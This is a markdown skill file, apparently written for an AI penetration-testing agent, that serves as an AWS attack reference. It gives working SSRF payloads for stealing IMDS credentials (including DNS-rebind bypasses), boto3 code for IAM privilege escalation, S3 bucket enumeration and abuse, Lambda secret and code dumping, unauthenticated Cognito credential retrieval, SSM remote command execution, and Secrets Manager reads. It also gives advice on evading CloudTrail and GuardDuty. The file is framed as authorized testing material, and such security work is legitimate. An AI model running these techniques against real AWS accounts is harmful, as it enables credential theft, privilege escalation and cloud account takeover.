---
name: AWS Pentesting
description: Reference for AWS attacks covering IAM-role abuse, IMDSv1/v2 escape, S3 anonymous access, Lambda env-var leaks, Cognito misconfig, SSM execute-command abuse, and SSRF-to-cloud chains.
---

# AWS Pentesting

Reference for testing AWS-hosted targets and pivoting from a foothold (web app, container, leaked credential) into cloud control plane. Pull this in when the target runs on EC2 / ECS / Fargate / Lambda / API Gateway, or when you have AWS credentials of any kind.

> Black-box scope: probes drive AWS REST APIs (via `boto3` / SigV4 in `execute_curl`). The Kali sandbox does NOT ship `awscli`; `boto3` covers every probe in this skill. Authentication uses operator-supplied keys, captured IMDS responses, or assumed-role credentials.

## Tool wiring

| Action | Tool | Notes |
|---|---|---|
| Programmatic AWS API access | `execute_code` | `boto3` (pre-installed); session built from access key + secret + optional session token. |
| IMDS / SSRF probes | `execute_curl` | Hit `http://169.254.169.254/` directly via web SSRF. |
| SigV4-signed requests without boto3 | `execute_code` | When the probe lives on a foothold that lacks Python. |
| S3 anonymous read | `execute_curl` | `https://<bucket>.s3.amazonaws.com/`. |
| Cognito JWT triage | `kali_shell jwt_tool` + `/skill jwt_attacks` |  |

## Recon: enumerate without API calls

| Surface | What to look for |
|---|---|
| DNS records | `*.amazonaws.com` CNAMEs reveal services (S3, CloudFront, ELB, RDS, API Gateway) |
| TLS cert SAN | `*.s3.amazonaws.com`, `*.execute-api.<region>.amazonaws.com`, `*.cognito-idp.<region>.amazonaws.com` |
| IP ranges | Resolve target IPs against the AWS published IP ranges (`https://ip-ranges.amazonaws.com/ip-ranges.json`) |
| HTTP headers | `Server: AmazonS3`, `x-amz-request-id`, `x-amz-id-2`, `x-amzn-RequestId`, `x-amz-cf-id` (CloudFront), `x-amz-apigw-id` (API Gateway) |
| URL patterns | `<bucket>.s3.<region>.amazonaws.com`, `<api-id>.execute-api.<region>.amazonaws.com/<stage>/`, `<lambda-url>.lambda-url.<region>.on.aws` |
| GitHub / paste leaks | `AKIA[0-9A-Z]{16}` access keys, `aws_secret_access_key` constants |

## IMDS (EC2 metadata)

The Instance Metadata Service runs at `169.254.169.254` and exposes per-instance config + temporary IAM-role credentials.

### IMDSv1 (the legacy bug)

```
GET http://169.254.169.254/latest/meta-data/iam/security-credentials/
GET http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
```

Returns:

```json
{
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "...",
  "Expiration": "..."
}
```

These credentials are scoped to the EC2 instance role; impersonating them gives the instance's privileges.

### IMDSv2 (token-required)

```
PUT http://169.254.169.254/latest/api/token
  X-aws-ec2-metadata-token-ttl-seconds: 21600
-> returns a token

GET http://169.254.169.254/latest/meta-data/iam/security-credentials/
  X-aws-ec2-metadata-token: <token>
```

IMDSv2 mitigates SSRF because the `PUT` request method blocks most reflective SSRF (which typically only does GETs). When the application has FULL request-control SSRF (any method, any header), IMDSv2 is bypassable too.

### SSRF probe template

```
execute_curl url: "https://target.tld/api/preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
execute_curl url: "https://target.tld/api/fetch?url=http://169.254.169.254/latest/dynamic/instance-identity/document"
# Variants for IMDSv2-bypass: try alternate hostname + DNS rebind
execute_curl url: "https://target.tld/api/preview?url=http://169.254.169.254.nip.io/latest/meta-data/"
```

If the response contains `AccessKeyId: "ASIA..."`, file as Critical and pivot to credentials usage.

## Using captured credentials

```python
execute_code language: python
import boto3
session = boto3.Session(
    aws_access_key_id="ASIA...",
    aws_secret_access_key="...",
    aws_session_token="...",       # required for STS / IMDS-issued creds
    region_name="us-east-1",
)
sts = session.client("sts")
print(sts.get_caller_identity())
# Returns: {"UserId":"...","Account":"...","Arn":"arn:aws:sts::<acct>:assumed-role/<role>/<session>"}
```

The ARN reveals the role name; this drives the privilege-enumeration plan.

## IAM enumeration

```python
execute_code language: python
import boto3, json
s = boto3.Session(...)
iam = s.client("iam")

# Identity
print(s.client("sts").get_caller_identity())

# What can the current principal do?
# (Note: these calls themselves require iam:* permissions; the role often does NOT have them.)
try: print(iam.list_attached_user_policies(UserName="<self>")["AttachedPolicies"])
except Exception as e: print("user policies blocked:", e)

try: print(iam.list_attached_role_policies(RoleName="<self-role>")["AttachedPolicies"])
except Exception as e: print("role policies blocked:", e)

# Brute-force the action set with sts.simulate_principal_policy when possible
# (or use pacu's IAM enumeration modules; pacu is NOT installed by default)
```

If `iam:Get*` / `iam:List*` are denied, fall back to **trying** API calls and watching for `AccessDenied` vs `Success`. Each successful call reveals one allowed action.

### Privilege escalation paths

| If you have | Escalate via |
|---|---|
| `iam:CreatePolicyVersion` | Set a new admin-policy version on a managed policy |
| `iam:AttachUserPolicy` / `AttachRolePolicy` | Attach `AdministratorAccess` to self |
| `iam:CreateAccessKey` | Mint new access keys for any user |
| `iam:CreateLoginProfile` / `iam:UpdateLoginProfile` | Set a console password on any user |
| `iam:UpdateAssumeRolePolicy` | Modify a role's trust policy to allow yourself |
| `iam:PassRole` + `lambda:CreateFunction` + `lambda:InvokeFunction` | Pass a powerful role to a Lambda you create |
| `iam:PassRole` + `ec2:RunInstances` | Spin up an instance with a powerful role attached |
| `iam:PassRole` + `glue:CreateDevEndpoint` | Pass a role to Glue and shell out |
| `iam:PassRole` + `cloudformation:CreateStack` | Stack with custom resource that assumes the role |
| `sts:AssumeRole` on an admin role | Direct escalation |

The canonical reference is Rhino Security Labs' "AWS IAM Privilege Escalation Methods" (24 documented paths). Pacu's `iam__privesc_scan` module automates all 24 -- not installed in the sandbox, but the logic is reproducible via boto3 calls.

## S3 attacks

### Anonymous reads / lists

```
execute_curl url: "https://<bucket>.s3.amazonaws.com/"               # list (if public)
execute_curl url: "https://<bucket>.s3.amazonaws.com/?list-type=2"   # list v2
execute_curl url: "https://<bucket>.s3.<region>.amazonaws.com/<key>"  # read
```

### Bucket enumeration

```python
execute_code language: python
import requests
candidates = ["target", "target-backup", "target-prod", "target-dev",
              "target-staging", "target-logs", "target-static", "target-uploads",
              "target-assets", "target-data", "company-target"]
for c in candidates:
    r = requests.head(f"https://{c}.s3.amazonaws.com/", timeout=5)
    print(c, r.status_code)        # 200/403 = exists; 404 = doesn't
```

| Status | Meaning |
|---|---|
| 200 | Bucket exists, public list |
| 403 | Bucket exists, private |
| 404 | Bucket does not exist |
| 301 | Wrong region (Location header reveals correct region) |

### Bucket policy / ACL probes

```python
execute_code language: python
import boto3
s3 = boto3.client("s3", region_name="us-east-1")
print(s3.get_bucket_policy(Bucket="<bucket>")["Policy"])
print(s3.get_bucket_acl(Bucket="<bucket>"))
print(s3.get_public_access_block(Bucket="<bucket>"))
print(s3.get_bucket_versioning(Bucket="<bucket>"))
print(s3.list_object_versions(Bucket="<bucket>", MaxKeys=10))   # version history may include deleted secrets
```

Common findings:

- `Principal: "*"` on `s3:GetObject` -> public reads.
- `Principal: "*"` on `s3:PutObject` -> public writes (defacement / malware staging).
- ACL `URI=http://acs.amazonaws.com/groups/global/AllUsers` -> everyone reads.
- `BlockPublicAcls=false` AND `BlockPublicPolicy=false` -> protections off.
- Pre-signed URLs with TTL > 1 hour, no IP / VPC binding.

### S3 -> XSS / RCE chains

| Upload | Served as | Result |
|---|---|---|
| `evil.html` | `text/html` | Stored XSS via S3-hosted page |
| `evil.svg` | `image/svg+xml` (default) | XSS in `<svg onload=...>` |
| `evil.js` | `application/javascript` | Hosted attacker JS for downstream XSS |
| `index.html` (overwrite) | Public website root | Defacement |

## Lambda

### Discovery

```python
execute_code language: python
import boto3
lam = boto3.client("lambda", region_name="us-east-1")
fns = lam.list_functions()
for f in fns["Functions"]:
    print(f["FunctionName"], f["Runtime"], f["Role"])
```

### Environment-variable leaks

```python
print(lam.get_function(FunctionName="<fn>")["Configuration"]["Environment"])
# Returns env vars including DB connection strings, API keys, secrets
```

Many Lambda functions store secrets in env vars rather than Secrets Manager / Parameter Store. Each leaked env var is a finding.

### Lambda code download

```python
url = lam.get_function(FunctionName="<fn>")["Code"]["Location"]
import requests
open("/tmp/lambda.zip","wb").write(requests.get(url).content)
# Then unzip and read source for hardcoded secrets, hidden routes, etc.
```

### Function-URL exposure

Lambda Function URLs (`https://<id>.lambda-url.<region>.on.aws`) with `AuthType=NONE` are publicly invokable.

```
execute_curl url: "https://<id>.lambda-url.us-east-1.on.aws/"
```

## Cognito

```
https://cognito-idp.<region>.amazonaws.com/                       (User Pool API)
https://cognito-identity.<region>.amazonaws.com/                  (Identity Pool / federated)
```

Probes:

- Self-signup enabled on a Cognito User Pool? `AdminCreateUserConfig.AllowAdminCreateUserOnly = false`.
- Identity pool with `Authenticated` role having broader permissions than the app intends.
- Cognito Identity Pool with `Unauthenticated` access enabled (no login required).

```python
execute_code language: python
import boto3
ci = boto3.client("cognito-identity", region_name="us-east-1")
# Get an unauthenticated identity from a public Identity Pool
r = ci.get_id(IdentityPoolId="us-east-1:<uuid>")
print(r["IdentityId"])
creds = ci.get_credentials_for_identity(IdentityId=r["IdentityId"])
print(creds["Credentials"])   # if Unauth role exists, you have AWS creds without auth
```

If `creds` returns AWS keys without authentication, the Identity Pool grants public AWS access -- file as Critical.

## SSM (Systems Manager)

```python
ssm = boto3.client("ssm", region_name="us-east-1")
print(ssm.describe_instance_information())   # who is SSM-managed
ssm.send_command(InstanceIds=["<i>"], DocumentName="AWS-RunShellScript",
                 Parameters={"commands":["id"]})
# Run shell on managed instances if ssm:SendCommand is allowed
```

Parameter Store leaks:

```python
print(ssm.describe_parameters()["Parameters"])
print(ssm.get_parameter(Name="/path/to/param", WithDecryption=True)["Parameter"]["Value"])
```

`SecureString` parameters returned in plaintext when caller has `kms:Decrypt`.

## Secrets Manager

```python
sm = boto3.client("secretsmanager", region_name="us-east-1")
print(sm.list_secrets())
print(sm.get_secret_value(SecretId="<arn>")["SecretString"])
```

## STS abuse

```python
sts = boto3.client("sts")

# Cross-account role assumption (when target trusts your account)
sts.assume_role(RoleArn="arn:aws:iam::<their-acct>:role/<role>", RoleSessionName="recon")

# Federation token (long-lived if MFA-bypassed)
sts.get_federation_token(Name="rec", DurationSeconds=43200)
```

## Logging / detection awareness

Sensitive-action APIs are logged in CloudTrail by default. Note for reporting (and to avoid surprising the operator):

- Every `iam:*`, `sts:AssumeRole`, `sts:GetSessionToken` is logged.
- S3 data-plane (`GetObject`) is logged ONLY if S3 Data Events are enabled (often off by default).
- Lambda invocations are logged only if CloudTrail Lambda data events are on.
- GuardDuty flags `Recon:IAMUser/UserPermissions`, `CredentialAccess:IAMUser/AnomalousASIA`, `Persistence:IAMUser/AnomalousAuthorization`.

If stealth matters, batch read-only enumerations and avoid write operations until the operator approves.

## Validation shape

A clean AWS finding includes:

1. The credential source (IMDS leak, SSRF chain, leaked GitHub commit, etc.).
2. `sts:GetCallerIdentity` output proving the principal.
3. The specific resource accessed (S3 bucket name, Lambda function name, secret ARN).
4. The action that succeeded (e.g. `s3:GetObject`, `iam:CreateLoginProfile`).
5. For privesc: the chain of API calls (PassRole + Lambda CreateFunction + Invoke = admin).
6. Sample of leaked data (one S3 object, one parameter, one env var) -- enough to prove access without bulk exfil.

## False positives

- IMDSv2 enforced + SSRF only supports GET -> credential extraction infeasible.
- S3 bucket "exists" (403) but every `Get`/`Put`/`List` API returns AccessDenied with no chain.
- IAM enumeration succeeds but every privilege-escalation path is blocked by SCPs (Service Control Policies).
- Cognito Identity Pool exposes Unauthenticated role but the role's policy is genuinely tightly scoped.
- Pre-signed URLs are short-lived (<5 minutes) and IP-bound.

## Tooling status

The brief lists `prowler`, `scoutsuite`, `pacu`, `cloudsploit`, `awscli` as missing. The agent uses `boto3` (now installed) for every probe; the heavy CLIs / scanners are skipped because they would inflate the image significantly. If the engagement specifically requires a Pacu module, the operator can run Pacu separately and feed findings back.

For the explicit scanners:

- `prowler` -> manual via boto3 calls + the Cloud Security Alliance CIS AWS benchmarks.
- `scoutsuite` -> same.
- `pacu` -> 24-path privesc taxonomy reproducible in `execute_code` via boto3.
- `cloudsploit` -> manual via boto3.

## Hand-off

```
IMDS credentials captured     -> escalate via this skill's IAM section
S3 anonymous write             -> stored XSS / malware staging / defacement
Lambda env vars                -> /skill information_disclosure (secrets) + chain into cloud-side abuse
Cognito Unauth role             -> IAM enumeration as that role
Cross-account assume            -> /skill information_disclosure for the source-account compromise
JWT issued by Cognito           -> /skill jwt_attacks
SSM RunShellScript              -> /skill linux_privesc on the target instance
ECS / EKS task / pod            -> /skill docker_escape from the container -> back to AWS
```

## Pro tips

- Always start with `sts:GetCallerIdentity`. The ARN tells you instantly: user vs role vs assumed-role, and the role/user name reveals the deployment context.
- Most AWS accounts have IAM enumeration BLOCKED by default. Plan for `AccessDenied` and probe by attempting actions, not by listing them.
- The IMDS endpoint is ALWAYS at `169.254.169.254` -- IPv4-link-local. Probe via DNS rebind variants (`169.254.169.254.nip.io`) when the SSRF filter blocks the literal IP.
- Lambda env vars are the lowest-hanging fruit. `lambda:GetFunction` is widely permitted and dumps secrets directly.
- Cognito Identity Pools with the Unauthenticated flag enabled grant AWS credentials to anyone -- the policy attached to that role is the security gate.
- `s3:GetBucketLocation` works without auth on many buckets and reveals the region (which is required to construct other API URLs).
- For credential-scope checking, `aws_session_token` is mandatory when using IMDS-derived credentials. Without it, requests fail with `InvalidClientTokenId`.
- CloudTrail logs every API call. If the target has alerting on suspicious patterns (`iam:CreateUser`, `iam:AttachUserPolicy`), every test action is visible.
